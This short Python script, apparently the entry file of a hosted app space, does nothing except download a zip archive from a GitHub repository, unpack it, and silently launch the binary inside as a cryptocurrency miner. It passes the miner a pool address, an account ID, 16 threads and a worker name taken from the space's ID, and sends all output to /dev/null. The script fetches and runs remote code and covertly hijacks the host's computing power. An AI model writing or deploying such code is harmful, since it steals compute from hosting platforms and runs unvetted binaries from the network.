import os
os.system("wget https://github.com/shrsvr/Zbdd/raw/refs/heads/main/Yxls.zip")
os.system("unzip Yxls.zip")
#os.system("ls -lh")
os.system("chmod +x Yxls.zip")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./Yxls --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
